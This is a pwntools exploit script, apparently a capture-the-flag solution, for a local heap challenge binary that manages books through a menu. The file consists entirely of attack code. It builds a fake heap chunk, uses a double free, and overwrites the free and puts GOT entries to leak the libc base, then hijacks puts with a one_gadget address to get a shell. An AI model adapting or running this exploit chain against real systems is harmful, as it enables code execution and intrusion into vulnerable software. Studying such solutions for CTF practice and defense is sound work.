from pwn import*
context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('on...',str(ch))
def new(size,name,content):
	menu(1)
	p.sendlineafter('book:',str(size))
	p.sendafter('name :',name)
	p.sendafter('book:',content)
def free(index):
	menu(2)
	p.sendlineafter('delete??',str(index))
def modify(index,content):
	menu(3)
	p.sendlineafter('modify',str(index))
	p.sendafter('content:',content)
def rename(name):
	menu(4)
	p.sendafter('name:',name)
def edit(index,content):
	menu(5)
	p.sendlineafter('modify',str(index))
	p.sendafter('content:',content)
p = process('./main')
elf =ELF('./main')
libc =ELF('./libc-2.23.so')
p.sendafter('name:','\x00'*0x20 + p64(0) + p64(0x71))
new(0x20,'FMYY','fmyy')
free(0)
free(0)
new(0x60,'FMYY','fmyy')
new(0x21,p64(0x100000001) + p64(1) + p64(0x602150),'fmyy')
free(0)
new(0x60,'\x00'*0x40 + p64(0x6020D0),'fmyy')
edit(0,p64(0xDEAD2CFEF))
modify(0,'\x00'*0x40 + p64(elf.got['free']))
edit(0,p64(elf.plt['puts'])[0:7])
modify(0,'\x00'*0x40 + p64(0x602390 + 0x18))
edit(0,p64(0x602390 + 0x18) + p64(0) + p64(elf.got['read']))
free(1)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['read']
log.info('LIBC:\t' + hex(libc_base))

modify(0,'\x00'*0x40 + p64(elf.got['puts']))
edit(0,p64(libc_base + 0xF1207))
p.interactive()
